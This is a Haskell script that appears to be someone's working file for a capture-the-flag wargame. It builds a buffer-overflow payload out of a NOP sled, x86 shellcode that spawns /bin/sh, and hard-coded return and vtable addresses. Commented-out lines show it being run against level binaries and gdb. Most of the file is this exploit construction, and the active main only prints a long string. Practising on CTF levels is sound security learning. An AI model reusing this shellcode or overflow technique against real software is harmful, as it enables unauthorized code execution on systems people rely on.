#!/usr/bin/env stack
-- stack --resolver=nightly-2015-07-08 runghc --package=shelly --package=bytestring --package=text --package=binary --package=unix

-- This gives us an experience similar to @ghci@.  Raw values (1 and
-- 10 below) that implement the 'Num' type class will be defaulted to 'Int'
-- (specified with the @default@ command below).  Raw values (all strings)
-- that implement the 'IsString' typeclass will be defaulted to Text (also
-- specified with the @default@ command below).
--
-- Without this extension turned on, ghc will produce errors like this:
-- @
--  code.hs:27:25:
--      No instance for (Data.String.IsString a0)
--            arising from the literal ‘"-alF"’
-- @
{-# LANGUAGE ExtendedDefaultRules #-}
{-# LANGUAGE OverloadedStrings    #-}
{-# OPTIONS_GHC -Wall #-}

-- Don't warn that things (like strings and numbers) are being defaulted to
-- certain types.  It's okay because this is just shell programming.
{-# OPTIONS_GHC -fno-warn-type-defaults #-}

import Control.Monad (forM_, void)
import Data.Binary (encode)
import qualified Data.ByteString.Lazy as B
import Data.ByteString.Lazy (ByteString)
import Data.Char (chr, ord)
import Data.Int (Int64)
import Data.Monoid ((<>))
import qualified Data.Text as T
import Data.Text (Text)
import GHC.Word (Word32, Word8)
import Numeric (showHex)
import Shelly ((</>), (<.>), (-|-), cmd, inspect, shelly, touchfile, withTmpDir)
import System.Posix.Process (executeFile)
import System.Process (callProcess, rawSystem)

-- Define the the types that should be defaulted to.  We can define one
-- type for string-like things, and one type for integer-like things.  It
-- doesn't matter what order they are in.
default (T.Text, Int)

nop :: Word8
nop = toEnum 0x90

-- | Pads a 'ByteString' with NOPs up to length 'Word32'.
padTo :: Word32 -> ByteString -> ByteString
padTo fullBufLength string = nopSled <> string
  where
    paddingLen :: Integer
    paddingLen = toInteger fullBufLength - toInteger (B.length string)

    nopSled :: ByteString
    nopSled = B.replicate (fromInteger paddingLen) nop

ebp :: Word32
ebp = 0xf8d0ffff

exploitLength :: Word32
exploitLength = 70


-- TODO: 2015-07-23: ./level08 (0x804ea20 + nop sled + exploit + 0x804ea14)
--                                  ^                                ^
--                                  |                                |
--                                  |           This is the address of the
--                                  |           beginning of the annotation
--                                  |           buffer for the Number(5)
--                                  |           thing.  This will be
--                                  |           written to Number(6)'s
--                                  |           pointer to the vtable for
--                                  |           the + method.
--                                  |
--                          This is a couple bytes
--                          into the nop sled, which is
--                          in the annotation buffer for
--                          Number(5).
--
-- (nop sled + exploit) should probably be 0x68 bytes long.

bufAddress :: Word32
-- bufAddress = 0xa0FBFFBF
-- bufAddress = 0x14ea0408
bufAddress = 0x0ca00408

secAddress :: Word32
secAddress = 0x20a00408

shellCode :: ByteString
shellCode = "\xeb\x18\x5e\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46"
         <> "\x0c\xb0\x0b\x8d\x1e\x8d\x4e\x08\x8d\x56\x0c\xcd\x80"
         <> "\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"

nonPaddedExploit :: ByteString
nonPaddedExploit = shellCode <> encode bufAddress

nopLength :: Int64
nopLength = 112 - 8 - B.length shellCode

paddedExploit :: ByteString
-- paddedExploit = padTo exploitLength nonPaddedExploit
paddedExploit = encode secAddress <> B.replicate nopLength nop <> nonPaddedExploit

paddedExploitString :: String
paddedExploitString = chr . fromEnum <$> B.unpack paddedExploit

turnIntoEscapedBashString :: String -> String
turnIntoEscapedBashString string = "$'" ++ go ++ "'"
  where
    go = concat $ fmap ((++) "\\x" . flip showHex "" . ord) string

main :: IO ()
main = do
    -- print "going..."
    -- rawSystem "./level05" [paddedExploitString]
    -- callProcess "./level05" [paddedExploitString]
    -- callProcess "gdb" ["./level05", "--args", paddedExploitString]
    -- executeFile "echo" True ["./level05", "--args", paddedExploitString] Nothing
    -- executeFile "gdb" True ["./level05", "--args", paddedExploitString] Nothing
    -- executeFile "stack" True ["--resolver=nightly-2015-07-08", "ghci", "breaker.hs", paddedExploitString] Nothing
    -- let firstArg = turnIntoEscapedBashString $ take 40 paddedExploitString
    --     secondArg = turnIntoEscapedBashString $ drop 40 paddedExploitString
    -- putStrLn $ "LANG=fr gdb -command test.gdb --args ./level06 " ++ firstArg ++ " " ++ secondArg
    -- putStrLn $ "gdb --args ./level09 " ++ turnIntoEscapedBashString paddedExploitString
    -- print "ended."
    B.putStrLn "hellooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo"

-- main = shelly $
--     withTmpDir $ \temp -> do
--         forM_ [1..10] $ \i ->
--             touchfile $ temp </> show i <.> "txt"
--         inspect temp
--         void $ cmd "ls" "-alF" temp
--         void $ cmd "find" temp
--         void $ cmd "echo" "here is my try at grepping:"
--         void $ cmd "ls" "-alF" temp -|- cmd "grep" "10\\.txt"
